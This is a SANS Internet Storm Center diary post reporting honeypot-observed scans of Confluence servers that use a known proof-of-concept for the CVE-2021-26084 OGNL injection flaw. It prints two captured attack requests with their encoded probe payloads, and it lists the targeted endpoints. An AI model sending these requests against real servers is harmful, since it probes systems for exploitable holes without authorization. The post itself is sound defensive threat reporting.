---
title: Internet Wide Scan Fingerprinting Confluence Servers, (Wed, Feb 22nd)
url: https://isc.sans.edu/diary/rss/29574
source: SANS Internet Storm Center, InfoCON: green
date: 2023-02-23
fetch_date: 2025-10-04T07:53:55.152566
---

# Internet Wide Scan Fingerprinting Confluence Servers, (Wed, Feb 22nd)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29570)
* [next](/diary/29578)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/cloudsecnext-summit-2025/course/application-security-securing-web-apps-api-microservices) | Denver | Oct 4th - Oct 9th 2025 |

# [Internet Wide Scan Fingerprinting Confluence Servers](/forums/diary/Internet%2BWide%2BScan%2BFingerprinting%2BConfluence%2BServers/29574/)

**Published**: 2023-02-22. **Last Updated**: 2023-02-22 13:54:55 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[2 comment(s)](/diary/Internet%2BWide%2BScan%2BFingerprinting%2BConfluence%2BServers/29574/#comments)

Looking over some of our honeypot logs today, I noticed one IP address, [60.223.74.99](/ipinfo.html?ip=60.223.74.99), scanning for several older Confluence vulnerabilities. ![confluence fingerprint icon](https://isc.sans.edu/diaryimages/images/Screenshot%202023-02-22%20at%208_52_14%20AM.png)

Confluence is the collaboration component of Atlassian's suite of developer tools [1]. Attacks against developers, and the tools they are using, are on the rise in general, and this is yet another "piece to the puzzle." A quick search using NIST's NVD shows 18 vulnerabilities in Confluence [2].

The scans use a known PoC exploit for [CVE-2021-26084](/vuln.html?cve=2021-26084), an OGNL injection vulnerability[3].

Here are two sample requests sent by the attacker:

> POST /users/user-dark-features HTTP/1.1
> Host: [redacted]:8090
> User-Agent: Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1
> Accept-Encoding: gzip, deflate
> Accept: \*/\*
> Connection: keep-alive
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 57
>
> queryString=aaaa%5Cu0027%2B%7B506%2A5210%7D%2B%5Cu0027bbb

> POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
> Host: [redacted]:8090
> User-Agent: Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1
> Accept-Encoding: gzip, deflate
> Accept: \*/\*
> Connection: keep-alive
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 58
>
> queryString=aaaa%5Cu0027%2B%7B3304%2A9626%7D%2B%5Cu0027bbb

All endpoints hit by the attacker:

> /confluence/pages/createpage-entervariables.action
> /confluence/pages/createpage-entervariables.action?SpaceKey=x
> /pages/createpage.action?spaceKey=myproj
> /pages/createpage-entervariables.action
> /pages/createpage-entervariables.action?SpaceKey=x
> /pages/doenterpagevariables.action
> /pages/templates2/viewpagetemplate.action
> /template/custom/content-editor
> /templates/editor-preload-container
> /users/user-dark-features
> /wiki/pages/createpage-entervariables.action
> /wiki/pages/createpage-entervariables.action?SpaceKey=x

The payload string decodes to:

> aaaa'{506\*5210}'bbb

The likely goal is to have the system return the result of the math problem to see if it is vulnerable to this attack.

No scans were seen from that source IP until today. It appears to be an otherwise unremarkable IP address allocated to what looks like a China Unicom consumer. It may be a CGNAT address used by China Unicom.

[1] https://www.atlassian.com/software/confluence
[2] https://nvd.nist.gov/vuln/search/results?form\_type=Basic&results\_type=overview&query=cpe%3A2.3%3Aa%3Aatlassian%3Aconfluence\_data\_center&search\_type=all&isCpeNameSearch=false
[3] https://github.com/alt3kx/CVE-2021-26084\_PoC

---
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords: [atlasian](/tag.html?tag=atlasian) [confluence](/tag.html?tag=confluence) [cve202126084](/tag.html?tag=cve202126084)

[2 comment(s)](/diary/Internet%2BWide%2BScan%2BFingerprinting%2BConfluence%2BServers/29574/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/cloudsecnext-summit-2025/course/application-security-securing-web-apps-api-microservices) | Denver | Oct 4th - Oct 9th 2025 |

* [previous](/diary/29570)
* [next](/diary/29578)

### Comments

Suggest the keyword spelling be corrected to Atlassian (two ‘s’) for accuracy.

Perhaps this is a follow up scan to the recent Atlassian breach?

#### Robert

#### Feb 23rd 2023 2 years ago

This old script might have been used in this scan: https://blog.csdn.net/haoaaao/article/details/124542619
Same UA, same headers, same pages targeted, same query.

#### Robert

#### Feb 23rd 2023 2 years ago

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)